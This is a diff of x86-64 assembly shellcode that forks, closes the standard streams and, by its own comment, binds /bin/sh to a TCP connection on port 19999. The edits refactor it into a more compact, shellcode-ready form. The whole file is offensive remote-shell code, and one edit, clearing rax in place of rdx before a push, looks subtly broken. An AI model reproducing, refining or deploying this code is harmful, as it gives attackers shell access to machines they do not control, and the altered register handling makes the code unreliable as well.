@@ -1,13 +1,7 @@
 ; Open the /bin/sh and redirect stdin/stdout(err) to a TCP connection
 
-section .text
+BITS 64
 global _start
-
-memset_2zero_func:
-    xor al, al
-    mov rcx, rdx
-    rep stosb
-    ret
 
 _start:
     mov rax, 57                         ; Fork syscall number
@@ -37,7 +31,7 @@ child:
     syscall
 
     mov rax, 3                          ; close(STDIN_FILENO)
-    mov rdi, 0
+    xor rdi, rdi
     syscall
 
     mov rax, 3                          ; close(STDOUT_FILENO)
@@ -48,7 +42,7 @@ child:
     mov rdi, 2
     syscall
 
-    xor rdx, rdx
+    xor rax, rax
     mov dx, 0x006c
     push rdx
     mov rax, 0x6c756e2f7665642f
@@ -69,9 +63,12 @@ child:
     mov rdi, 0
     syscall
 
-    mov rdi, rsp
-    mov rdx, 16                         ; sockaddr_in size
-    call memset_2zero_func              ; null the sockaddr_in
+    sub rsp, 0x40
+
+    lea rdi, [rsp]                      
+    xor rax, rax                        
+    mov rcx, 16                         ; sockaddr_in size
+    rep stosb
 
     mov word [rsp], 2
     mov word [rsp + 2], 0x1F4E          ; port = 19999
@@ -116,7 +113,7 @@ child:
     mov rdi, r12
     syscall
 
-    add rsp, 16                         ; free stack for sockaddr_in
+    add rsp, 0x40                       ; free stack for sockaddr_in
 
     xor rax, rax                        ; rax turns to null byte
 
